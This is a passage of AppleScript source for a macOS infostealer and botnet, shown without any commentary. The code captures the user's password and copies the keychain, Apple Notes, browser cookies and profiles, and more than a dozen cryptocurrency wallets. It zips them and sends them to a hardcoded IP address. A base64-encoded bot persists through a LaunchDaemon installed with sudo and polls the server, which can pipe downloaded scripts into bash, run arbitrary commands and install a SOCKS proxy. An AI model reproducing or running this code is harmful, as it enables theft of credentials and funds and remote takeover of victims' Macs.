Y0NTUxODEzNTIwODgzMTkpIHRoZW4iICYgcmV0dXJuICYgInJldHVybiIgJiByZXR1cm4gJiAiZW5kIGlmIiAmIHJldHVybiAmICIiICYgcmV0dXJuICYgInNldCB2NDA3MTQ1NjczOTY0Nzk1OTMyMCB0byAoc3lzdGVtIGF0dHJpYnV0ZSBcIlVTRVJcIikiICYgcmV0dXJuICYgInNldCB2NzcyNDA5NTE0NzM2OTU0NjQ1NSB0byBcIi9Vc2Vycy9cIiAmIHY0MDcxNDU2NzM5NjQ3OTU5MzIwIiAmIHJldHVybiAmICJpZiBmODA2Mzc2ODA5MDYyNDgyMTI2NSh2NzcyNDA5NTE0NzM2OTU0NjQ1NSAmIFwiLy51bmluc3RhbGxlZFwiKSBpcyBlcXVhbCB0byBcIitcIiB0aGVuIiAmIHJldHVybiAmICJyZXR1cm4iICYgcmV0dXJuICYgImVuZCBpZiIgJiByZXR1cm4gJiAic2V0IHY2NzgxNDYxMjM4NDE0ODUwNDM2IHRvIHY3NzI0MDk1MTQ3MzY5NTQ2NDU1ICYgXCIvLmxhc3RhY3Rpb25cIiIgJiByZXR1cm4gJiAic2V0IHY3MzM0NzgxODQxODE1MzM2Mzc2IHRvIHY3NzI0MDk1MTQ3MzY5NTQ2NDU1ICYgXCIvLmJvdGlkXCIiICYgcmV0dXJuICYgInNldCB2NzYyNzEyNzM0NDc5MDU4Mzg5OSB0byB2NzcyNDA5NTE0NzM2OTU0NjQ1NSAmIFwiLy5jaG9zdFwiIiAmIHJldHVybiAmICJzZXQgdjY2MzA2Mjc1NjM1NDg4MTk3MjUgdG8gdjc3MjQwOTUxNDczNjk1NDY0NTUgJiBcIi8udXNlcm5hbWVcIiIgJiByZXR1cm4gJiAic2V0IHY2MjAwMDQ1MzQ5MDkxMzczNzgyIHRvIGY4MDYzNzY4MDkwNjI0ODIxMjY1KHY3NjI3MTI3MzQ0NzkwNTgzODk5KSIgJiByZXR1cm4gJiAiaWYgdjYyMDAwNDUzNDkwOTEzNzM3ODIgaXMgZXF1YWwgdG8gXCJcIiB0aGVuIiAmIHJldHVybiAmICJyZXR1cm4iICYgcmV0dXJuICYgImVuZCBpZiIgJiByZXR1cm4gJiAic2V0IHY2MjAwMDQ1MzQ5MDkxMzczNzgyIHRvIGYxOTczMjY5MDUwMTA4NDE1MDQ3KHY2MjAwMDQ1MzQ5MDkxMzczNzgyKSIgJiByZXR1cm4gJiAic2V0IHYzNzM4MTA5MTQ5NDA0NzY2NzY1IHRvIGY4MDYzNzY4MDkwNjI0ODIxMjY1KHY2NjMwNjI3NTYzNTQ4ODE5NzI1KSIgJiByZXR1cm4gJiAiaWYgdjM3MzgxMDkxNDk0MDQ3NjY3NjUgaXMgZXF1YWwgdG8gXCJcIiB0aGVuIiAmIHJldHVybiAmICJyZXR1cm4iICYgcmV0dXJuICYgImVuZCBpZiIgJiByZXR1cm4gJiAic2V0IHYzNzM4MTA5MTQ5NDA0NzY2NzY1IHRvIGYxOTczMjY5MDUwMTA4NDE1MDQ3KHYzNzM4MTA5MTQ5NDA0NzY2NzY1KSIgJiByZXR1cm4gJiAiIiAmIHJldHVybiAmICJzZXQgdjI2ODQ1MzM5NzAyMTk1ODA5MjkgdG8gZjgwNjM3NjgwOTA2MjQ4MjEyNjUodjczMzQ3ODE4NDE4MTUzMzYzNzYpIiAmIHJldHVybiAmICJzZXQgdjI2ODQ1MzM5NzAyMTk1ODA5MjkgdG8gZjE5NzMyNjkwNTAxMDg0MTUwNDcodjI2ODQ1MzM5NzAyMTk1ODA5MjkpIiAmIHJldHVybiAmICJpZiB2MjY4NDUzMzk3MDIxOTU4MDkyOSBpcyBlcXVhbCB0byBcIlwiIHRoZW4iICYgcmV0dXJuICYgInNldCB2ODc3NDUzNTk0ODU3NzcyMDg5OSB0byBkbyBzaGVsbCBzY3JpcHQgXCJzd192ZXJzIC1wcm9kdWN0VmVyc2lvblwiIiAmIHJldHVybiAmICJzZXQgdjI2ODQ1MzM5NzAyMTk1ODA5MjkgdG8gZjYwNzIxNzczNDAyMDgyMzcyNTUodjYyMDAwNDUzNDkwOTEzNzM3ODIsIHYzNzM4MTA5MTQ5NDA0NzY2NzY1LCB2ODc3NDUzNTk0ODU3NzcyMDg5OSwgMSkiICYgcmV0dXJuICYgImlmIHYyNjg0NTMzOTcwMjE5NTgwOTI5IGlzIGVxdWFsIHRvIFwibm90XCIgdGhlbiIgJiByZXR1cm4gJiAiZjUzMTMxMzc5MjY3NDM1MDg1MjEodjc3MjQwOTUxNDczNjk1NDY0NTUpIiAmIHJldHVybiAmICJyZXR1cm4iICYgcmV0dXJuICYgImVuZCBpZiIgJiByZXR1cm4gJiAiZjU1NjkxNDI3ODg3NDQwMTY5OTcodjczMzQ3ODE4NDE4MTUzMzYzNzYsIHYyNjg0NTMzOTcwMjE5NTgwOTI5KSIgJiByZXR1cm4gJiAiZGVsYXkgNjAiICYgcmV0dXJuICYgImVuZCBpZiIgJiByZXR1cm4gJiAicmVwZWF0IiAmIHJldHVybiAmICJzZXQgdjYyNDE4NDYxMzI5MTAwNzMzNjcgdG8gZjgwNjM3NjgwOTA2MjQ4MjEyNjUodjY3ODE0NjEyMzg0MTQ4NTA0MzYpIiAmIHJldHVybiAmICJzZXQgdjEzMDYxNTcwMzgxMTYwMjExODkgdG8gZjM4NTI2MDkxNDg3NzAxOTQ4MjEodjYyMDAwNDUzNDkwOTEzNzM3ODIsIHYyNjg0NTMzOTcwMjE5NTgwOTI5LCAxKSIgJiByZXR1cm4gJiAiaWYgdjEzMDYxNTcwMzgxMTYwMjExODkgaXMgZXF1YWwgdG8gXCJub3RcIiB0aGVuIiAmIHJldHVybiAmICJmNTMxMzEzNzkyNjc0MzUwODUyMSh2NzcyNDA5NTE0NzM2OTU0NjQ1NSkiICYgcmV0dXJuICYgInJldHVybiIgJiByZXR1cm4gJiAiZW5kIGlmIiAmIHJldHVybiAmICJzZXQgdjUyNjk1OTM2NDU1NTAxNTQwMDEgdG8gaXRlbSAxIG9mIHYxMzA2MTU3MDM4MTE2MDIxMTg5IiAmIHJldHVybiAmICJzZXQgdjQ4ODcwMzA2MjE2MDc0MjA0MTcgdG8gaXRlbSAyIG9mIHYxMzA2MTU3MDM4MTE2MDIxMTg5IiAmIHJldHVybiAmICJzZXQgdjIwNTI5NzIxMzMzMTg0MzAxMzIgdG8gaXRlbSAzIG9mIHYxMzA2MTU3MDM4MTE2MDIxMTg5IiAmIHJldHVybiAmICJpZiB2NDg4NzAzMDYyMTYwNzQyMDQxNyBpcyBlcXVhbCB0byBcInVuaW5zdGFsbFwiIHRoZW4iICYgcmV0dXJuICYgImY1MzEzMTM3OTI2NzQzNTA4NTIxKHY3NzI0MDk1MTQ3MzY5NTQ2NDU1KSIgJiByZXR1cm4gJiAicmV0dXJuIiAmIHJldHVybiAmICJlbmQgaWYiICYgcmV0dXJuICYgIiIgJiByZXR1cm4gJiAiaWYgdjUyNjk1OTM2NDU1NTAxNTQwMDEgaXMgbm90IGVxdWFsIHRvIHY2MjQxODQ2MTMyOTEwMDczMzY3IHRoZW4iICYgcmV0dXJuICYgInNldCB2NjI0MTg0NjEzMjkxMDA3MzM2NyB0byB2NTI2OTU5MzY0NTU1MDE1NDAwMSIgJiByZXR1cm4gJiAiZjU1NjkxNDI3ODg3NDQwMTY5OTcodjY3ODE0NjEyMzg0MTQ4NTA0MzYsIHY2MjQxODQ2MTMyOTEwMDczMzY3KSIgJiByZXR1cm4gJiAiaWYgdjQ4ODcwMzA2MjE2MDc0MjA0MTcgaXMgZXF1YWwgdG8gXCJyZXBlYXRcIiB0aGVuIiAmIHJldHVybiAmICJ0cnkiICYgcmV0dXJuICYgImRvIHNoZWxsIHNjcmlwdCBcImN1cmwgLXMgaHR0cDovL1wiICYgdjYyMDAwNDUzNDkwOTEzNzM3ODIgJiBcIi9hcGkvdjEvYm90L3JlcGVhdC9cIiAmIHYzNzM4MTA5MTQ5NDA0NzY2NzY1ICYgXCIgfCBiYXNoICZcIiIgJiByZXR1cm4gJiAiZW5kIHRyeSIgJiByZXR1cm4gJiAiZW5kIGlmIiAmIHJldHVybiAmICJpZiB2NDg4NzAzMDYyMTYwNzQyMDQxNyBpcyBlcXVhbCB0byBcImRvc2hlbGxcIiB0aGVuIiAmIHJldHVybiAmICJ0cnkiICYgcmV0dXJuICYgImRvIHNoZWxsIHNjcmlwdCB2MjA1Mjk3MjEzMzMxODQzMDEzMiIgJiByZXR1cm4gJiAiZW5kIHRyeSIgJiByZXR1cm4gJiAiZW5kIGlmIiAmIHJldHVybiAmICJpZiB2NDg4NzAzMDYyMTYwNzQyMDQxNyBpcyBlcXVhbCB0byBcImVuYWJsZXNvY2tzNVwiIHRoZW4iICYgcmV0dXJuICYgInRyeSIgJiByZXR1cm4gJiAiZG8gc2hlbGwgc2NyaXB0IFwiY3VybCAtbyAvdG1wL3NvY2tzIGh0dHA6Ly9cIiAmIHY2MjAwMDQ1MzQ5MDkxMzczNzgyICYgXCIvb3RoZXJhc3NldHMvc29ja3NcIiIgJiByZXR1cm4gJiAiZG8gc2hlbGwgc2NyaXB0IFwiY2htb2QgK3ggL3RtcC9zb2Nrc1wiIiAmIHJldHVybiAmICJkbyBzaGVsbCBzY3JpcHQgXCIvdG1wL3NvY2tzID4gL2Rldi9udWxsIDI+JjEgJiBkaXNvd25cIiIgJiByZXR1cm4gJiAiZW5kIHRyeSIgJiByZXR1cm4gJiAiZW5kIGlmIiAmIHJldHVybiAmICJlbmQgaWYiICYgcmV0dXJuICYgImRlbGF5IDYwIiAmIHJldHVybiAmICJlbmQgcmVwZWF0IiAmIHJldHVybiAmICJlbmQgZjg5Njc5MTUxMDc5NzkyMzcwODUiICYgcmV0dXJuICYgImY4OTY3OTE1MTA3OTc5MjM3MDg1KGFwcF9pZCkiICYgcmV0dXJuICYgIiIgJiByZXR1cm4n"
		set mybotnet to (do shell script "echo \"" & mybotnetB64 & "\" | base64 -d")
		set plistAutoStart to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
	<key>KeepAlive</key>
	<true/>
	<key>Label</key>
	<string>" & serviceName & "</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
        <string>" & mybotnet & "</string>
	</array>
	<key>UserName</key>
    <string>" & macUsername & "</string>
	<key>RunAtLoad</key>
	<true/>
	<key>SessionCreate</key>
	<true/>
</dict>
</plist>"
		writeText(plistAutoStart, "/tmp/starter")
		do shell script "echo " & quoted form of pwd & " | sudo -S cp /tmp/starter /Library/LaunchDaemons/" & serviceName & ".plist"
		try
			do shell script "echo " & quoted form of pwd & " | sudo -S launchctl bootstrap system /Library/LaunchDaemons/" & serviceName & ".plist"
		on error
			do shell script "nohup " & mybotnet & " >/dev/null 2>&1 &"
		end try
	end try
end botnet_init
on main()
	set macUsername to (system attribute "USER")
	set outUsername to "boss"
	set serverIP to "217.119.139.117"
	set isBot to "false"
	
	try
		do shell script "curl -H \"eblan: 1\" http://" & serverIP & "/api/v1/xuystats"
	end try
	
	set systemProfile to "/Users/" & macUsername
	writeText(outUsername, systemProfile & "/.username")
	writeText(serverIP, systemProfile & "/.chost")
	set randomMindNumber to (random number from 10000 to 100000) as text
	set writemind to "/tmp/" & randomMindNumber & "/"
	try
		set result_userinfo to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
		writeText(result_userinfo, writemind & "hardware")
	end try
	set rawlib to systemProfile & "/Library/"
	set library to rawlib & "Application Support/"
	set password_entered to readfile(systemProfile & "/.pwd")
	if not checkvalid(macUsername, password_entered) then
		set password_entered to getpwd(macUsername, writemind)
		writeText(password_entered, systemProfile & "/.pwd")
	end if
	delay 0.01
	writeText(password_entered, writemind & "pwd")
	
	set noteStorePath to rawlib & "Group Containers/group.com.apple.notes/NoteStore.sqlite"
	readwrite(noteStorePath, writemind & "finder/NoteStore.sqlite")
	readwrite(noteStorePath & "-wal", writemind & "finder/NoteStore.sqlite-wal")
	readwrite(noteStorePath & "-shm", writemind & "finder/NoteStore.sqlite-shm")
	readwrite(rawlib & "Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "finder/Cookies.binarycookies")
	readwrite(rawlib & "Cookies/Cookies.binarycookies", writemind & "finder/saf1")
	
	filegrabber(writemind)
	
	try
		set appsTxt to ""
		set apps to list folder "/Applications"
		repeat with appName in apps
			set appsTxt to appsTxt & appName & return
		end repeat
		writeText(appsTxt, writemind & "installedSoft")
	end try
	
	set chromiumMap to {{"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}}
	
	set walletMap to {{"Electrum", systemProfile & "/.electrum/wallets/"}, {"Coinomi", library & "Coinomi/wallets/"}, {"Exodus", library & "Exodus/"}, {"Atomic", library & "atomic/Local Storage/leveldb/"}, {"Wasabi", systemProfile & "/.walletwasabi/client/Wallets/"}, {"Ledger_Live", library & "Ledger Live/"}, {"Monero", systemProfile & "/Monero/wallets/"}, {"Bitcoin_Core", library & "Bitcoin/wallets/"}, {"Litecoin_Core", library & "Litecoin/wallets/"}, {"Dash_Core", library & "DashCore/wallets/"}, {"Electrum_LTC", systemProfile & "/.electrum-ltc/wallets/"}, {"Electron_Cash", systemProfile & "/.electron-cash/wallets/"}, {"Guarda", library & "Guarda/"}, {"Dogecoin_Core", library & "Dogecoin/wallets/"}, {"Trezor_Suite", library & "@trezor/suite-desktop/"}}
	readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
	readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
	readwrite(rawlib & "Keychains/login.keychain-db", writemind & "kc")
	
	writeText(macUsername, writemind & "user")
	set ff_paths to {{"Firefox", library & "Firefox/Profiles/"}, {"Waterfox", library & "Waterfox/Profiles/"}}
	repeat with gecko in ff_paths
		try
			parseFF(item 1 of gecko, item 2 of gecko, writemind)
		end try
	end repeat
	
	repeat with deskWallet in walletMap
		GrabFolder(item 2 of deskWallet, writemind & "deskwallets/" & item 1 of deskWallet)
	end repeat
	chromium(writemind, chromiumMap)
	do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/out.zip"
	send_data(0, outUsername, serverIP, isBot)
	do shell script "rm -r " & writemind
	do shell script "rm /tmp/out.zip"
	
	ledger(systemProfile, password_entered, serverIP)
	
	try
		if readfile(systemProfile & "/.botid") is equal to "" then
			botnet_init(macUsername, password_entered, serverIP)
		end if
	end try
end main

main()'